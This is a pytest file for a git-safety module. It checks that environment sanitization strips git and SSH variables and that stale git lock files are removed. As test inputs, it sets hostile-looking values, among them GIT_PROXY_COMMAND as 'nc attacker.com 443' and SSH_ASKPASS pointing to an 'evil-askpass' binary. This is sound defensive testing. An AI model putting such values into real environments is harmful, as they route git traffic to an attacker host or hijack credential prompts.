"""Tests for foundry_git_safety.subprocess_env — environment sanitization and lock cleanup."""

import os
import stat
import time
from unittest.mock import patch

import pytest

from foundry_git_safety.subprocess_env import (
    ENV_ALLOWED,
    ENV_PREFIX_STRIP,
    ENV_VARS_TO_CLEAR,
    _GIT_LOCK_NAMES,
    _STALE_LOCK_AGE,
    build_clean_env,
    remove_stale_config_locks,
)


# ---------------------------------------------------------------------------
# TestBuildCleanEnv
# ---------------------------------------------------------------------------


class TestBuildCleanEnv:
    """Tests for build_clean_env() environment sanitization."""

    def test_removes_git_config_parameters(self):
        """GIT_CONFIG_PARAMETERS is never present in the clean env."""
        with patch.dict(os.environ, {"GIT_CONFIG_PARAMETERS": "--global foo"}, clear=False):
            env = build_clean_env()
            assert "GIT_CONFIG_PARAMETERS" not in env

    def test_removes_git_ssh_command(self):
        """GIT_SSH_COMMAND is never present in the clean env."""
        with patch.dict(os.environ, {"GIT_SSH_COMMAND": "ssh -o StrictHostKeyChecking=no"}, clear=False):
            env = build_clean_env()
            assert "GIT_SSH_COMMAND" not in env

    def test_removes_git_dir(self):
        """GIT_DIR is never present in the clean env."""
        with patch.dict(os.environ, {"GIT_DIR": "/malicious/path"}, clear=False):
            env = build_clean_env()
            assert "GIT_DIR" not in env

    def test_removes_git_work_tree(self):
        """GIT_WORK_TREE is never present in the clean env."""
        with patch.dict(os.environ, {"GIT_WORK_TREE": "/some/tree"}, clear=False):
            env = build_clean_env()
            assert "GIT_WORK_TREE" not in env

    def test_removes_ssh_askpass(self):
        """SSH_ASKPASS is never present in the clean env."""
        with patch.dict(os.environ, {"SSH_ASKPASS": "/usr/bin/evil-askpass"}, clear=False):
            env = build_clean_env()
            assert "SSH_ASKPASS" not in env

    def test_removes_all_env_vars_to_clear(self):
        """Every variable listed in ENV_VARS_TO_CLEAR is absent from clean env."""
        # Set them all in os.environ
        env_patch = {var: "SHOULD_BE_REMOVED" for var in ENV_VARS_TO_CLEAR}
        with patch.dict(os.environ, env_patch, clear=False):
            env = build_clean_env()
            for var in ENV_VARS_TO_CLEAR:
                assert var not in env, f"{var} should have been stripped but was present"

    def test_removes_all_prefix_stripped_vars(self):
        """Variables matching ENV_PREFIX_STRIP prefixes are absent from clean env."""
        dangerous = {
            "GIT_PROXY_COMMAND": "nc attacker.com 443",
            "GIT_DIFF_OPTS": "--malicious",
            "SSH_AUTH_SOCK": "/tmp/ssh-malicious",
            "SSH_PRIVATE_KEY": "secret-key",
        }
        with patch.dict(os.environ, dangerous, clear=False):
            env = build_clean_env()
            for key in dangerous:
                assert key not in env, f"{key} matches a stripped prefix but was present"

    def test_keeps_path(self):
        """PATH is preserved from the real environment."""
        with patch.dict(os.environ, {"PATH": "/usr/bin:/bin"}, clear=False):
            env = build_clean_env()
            assert env.get("PATH") == "/usr/bin:/bin"

    def test_home_isolated(self):
        """HOME is set to an isolated value to prevent ~/.gitconfig reads."""
        with patch.dict(os.environ, {"HOME": "/home/testuser"}, clear=False):
            env = build_clean_env()
            assert env.get("HOME") != "/home/testuser"
            assert "GIT_CONFIG_GLOBAL" in env
            assert env["GIT_CONFIG_GLOBAL"] == "/dev/null"

    def test_keeps_user(self):
        """USER is preserved from the real environment."""
        with patch.dict(os.environ, {"USER": "testuser"}, clear=False):
            env = build_clean_env()
            assert env.get("USER") == "testuser"

    def test_provides_default_path_when_missing(self):
        """When PATH is unset in os.environ, a sensible default is provided."""
        with patch.dict(os.environ, {}, clear=True):
            env = build_clean_env()
            assert "PATH" in env
            assert "/usr/bin" in env["PATH"]

    def test_passes_foundry_proxy_git_token(self):
        """FOUNDRY_PROXY_GIT_TOKEN is forwarded when set."""
        with patch.dict(
            os.environ,
            {"FOUNDRY_PROXY_GIT_TOKEN": "tok-12345"},
            clear=False,
        ):
            env = build_clean_env()
            assert env.get("FOUNDRY_PROXY_GIT_TOKEN") == "tok-12345"

    def test_omits_foundry_proxy_git_token_when_unset(self):
        """FOUNDRY_PROXY_GIT_TOKEN is absent when not set in os.environ."""
        env = build_clean_env()
        if "FOUNDRY_PROXY_GIT_TOKEN" in os.environ:
            pytest.skip("FOUNDRY_PROXY_GIT_TOKEN is set in the real environment")
        assert "FOUNDRY_PROXY_GIT_TOKEN" not in env

    def test_only_contains_allowed_keys_plus_token(self):
        """The clean env contains only keys from ENV_ALLOWED, git config overrides, and the proxy token."""
        _ALLOWED_EXTRA = {"FOUNDRY_PROXY_GIT_TOKEN", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM"}
        with patch.dict(
            os.environ,
            {"PATH": "/bin", "HOME": "/home/test", "GIT_FOO": "bad", "SSH_BAR": "bad"},
            clear=False,
        ):
            env = build_clean_env()
            for key in env:
                if key in _ALLOWED_EXTRA:
                    continue
                assert key in ENV_ALLOWED, f"Unexpected key {key} in clean env"


# ---------------------------------------------------------------------------
# TestRemoveStaleConfigLocks
# ---------------------------------------------------------------------------


class TestRemoveStaleConfigLocks:
    """Tests for remove_stale_config_locks() stale lockfile cleanup."""

    @staticmethod
    def _setup_bare_repo(tmp_path):
        """Create a minimal bare repo directory structure for testing."""
        bare_repo = tmp_path / "bare.git"
        bare_repo.mkdir()
        (bare_repo / "HEAD").write_text("ref: refs/heads/main\n")
        (bare_repo / "config").write_text("[core]\n\trepositoryformatversion = 0\n")
        return str(bare_repo)

    @staticmethod
    def _setup_worktree(tmp_path, bare_repo_path):
        """Create a worktree with a .git file pointing into the bare repo."""
        worktree = tmp_path / "worktree"
        worktree.mkdir()

        # The worktree's gitdir inside the bare repo
        gitdir = tmp_path / "bare.git" / "worktrees" / "worktree"
        gitdir.mkdir(parents=True)

        # .git file in worktree points to the gitdir
        (worktree / ".git").write_text(f"gitdir: {gitdir}\n")

        # commondir inside the gitdir points back to bare repo
        (gitdir / "commondir").write_text(f"{bare_repo_path}\n")

        return str(worktree), str(gitdir)

    def test_removes_stale_config_lock(self, tmp_path):
        """A config.lock file older than _STALE_LOCK_AGE is removed."""
        bare_repo = self._setup_bare_repo(tmp_path)
        lock_file = tmp_path / "bare.git" / "config.lock"
        lock_file.write_text("")

        # Make the lock file old enough to be considered stale
        old_mtime = time.time() - _STALE_LOCK_AGE - 10
        os.utime(str(lock_file), (old_mtime, old_mtime))

        with patch(
            "foundry_git_safety.branch_isolation.resolve_bare_repo_path",
            return_value=bare_repo,
        ):
            remove_stale_config_locks(str(tmp_path))

        assert not lock_file.exists(), "Stale config.lock should have been removed"

    def test_removes_stale_head_lock(self, tmp_path):
        """A HEAD.lock file older than _STALE_LOCK_AGE is removed."""
        bare_repo = self._setup_bare_repo(tmp_path)
        lock_file = tmp_path / "bare.git" / "HEAD.lock"
        lock_file.write_text("")

        old_mtime = time.time() - _STALE_LOCK_AGE - 10
        os.utime(str(lock_file), (old_mtime, old_mtime))

        with patch(
            "foundry_git_safety.branch_isolation.resolve_bare_repo_path",
            return_value=bare_repo,
        ):
            remove_stale_config_locks(str(tmp_path))

        assert not lock_file.exists(), "Stale HEAD.lock should have been removed"

    def test_does_not_remove_fresh_lock(self, tmp_path):
        """A recently created lock file is not removed."""
        bare_repo = self._setup_bare_repo(tmp_path)
        lock_file = tmp_path / "bare.git" / "config.lock"
        lock_file.write_text("")

        # Fresh lock: mtime is now
        now = time.time()
        os.utime(str(lock_file), (now, now))

        with patch(
            "foundry_git_safety.branch_isolation.resolve_bare_repo_path",
            return_value=bare_repo,
        ):
            remove_stale_config_locks(str(tmp_path))

        assert lock_file.exists(), "Fresh config.lock should NOT have been removed"

    def test_handles_missing_lock_gracefully(self, tmp_path):
        """When no lock file exists, the function completes without error."""
        bare_repo = self._setup_bare_repo(tmp_path)

        with patch(
            "foundry_git_safety.branch_isolation.resolve_bare_repo_path",
            return_value=bare_repo,
        ):
            # Should not raise
            remove_stale_config_locks(str(tmp_path))

    def test_handles_missing_git_dir_gracefully(self, tmp_path):
        """When resolve_bare_repo_path returns None, the function does nothing."""
        with patch(
            "foundry_git_safety.branch_isolation.resolve_bare_repo_path",
            return_value=None,
        ):
            # Should not raise
            remove_stale_config_locks(str(tmp_path / "nonexistent"))

    def test_removes_lock_from_worktree_gitdir(self, tmp_path):
        """Stale locks in the worktree's gitdir are also removed."""
        bare_repo = self._setup_bare_repo(tmp_path)
        worktree, gitdir = self._setup_worktree(tmp_path, bare_repo)

        # Create a stale lock in the worktree gitdir
        lock_file = tmp_path / "bare.git" / "worktrees" / "worktree" / "config.lock"
        lock_file.write_text("")
        old_mtime = time.time() - _STALE_LOCK_AGE - 10
        os.utime(str(lock_file), (old_mtime, old_mtime))

        with patch(
            "foundry_git_safety.branch_isolation.resolve_bare_repo_path",
            return_value=bare_repo,
        ):
            remove_stale_config_locks(worktree)

        assert not lock_file.exists(), "Stale lock in worktree gitdir should have been removed"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
